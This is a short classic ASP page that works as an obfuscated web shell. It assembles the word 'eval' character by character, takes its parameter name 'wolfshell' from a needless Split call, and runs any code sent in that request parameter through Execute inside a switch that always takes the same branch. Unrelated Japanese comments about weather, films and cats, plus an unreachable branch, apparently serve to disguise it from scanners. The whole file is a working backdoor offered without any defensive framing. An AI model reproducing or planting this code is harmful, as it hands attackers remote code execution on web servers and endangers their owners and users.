<%
'// 今日の天気は晴れです。
Dim op_str_01, param_str_02, state_flag_03

op_str_01 = "e"
op_str_01 = op_str_01 & "v"
op_str_01 = op_str_01 & "a"
op_str_01 = op_str_01 & "l"

'// 週末、映画を見に行きました。
param_str_02 = Split("wolfshell", "z")(0)

'// このスイッチは常にケース1を実行します。
state_flag_03 = 1

Select Case state_flag_03
    Case 1
        '// 猫はとてもかわいいです。
        Execute(op_str_01 & "(request(""" & param_str_02 & """))")
    Case 2
        '// このコードブロックは決して実行されません。
        response.write("unreachable")
End Select
%>